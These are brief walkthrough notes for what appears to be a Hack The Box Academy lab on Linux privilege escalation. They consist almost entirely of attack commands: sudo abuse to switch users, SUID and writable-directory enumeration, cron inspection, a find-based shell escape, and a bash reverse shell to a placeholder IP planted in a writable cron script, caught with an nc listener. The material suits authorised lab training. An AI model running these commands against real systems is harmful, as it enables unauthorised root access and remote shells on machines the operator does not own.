# https://academy.hackthebox.com/module/77/section/844

# SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.
ssh <USERNAME>@<TARGET_IP>-p port
sudo -l
sudo -u user2 -i
cd /home/user2
cat flag.txt

# Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
ssh user1@target_ip -p port
sudo -u user2 -i
sudo -l
find / -perm -4000 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
sudo vim
find . -exec /bin/sh \; -quit
echo "bash -i >& /dev/tcp/your_ip/your_port 0>&1" > /path/to/writable/script
nc -lvnp <YOUR_PORT>
cd /root
cat flag.txt

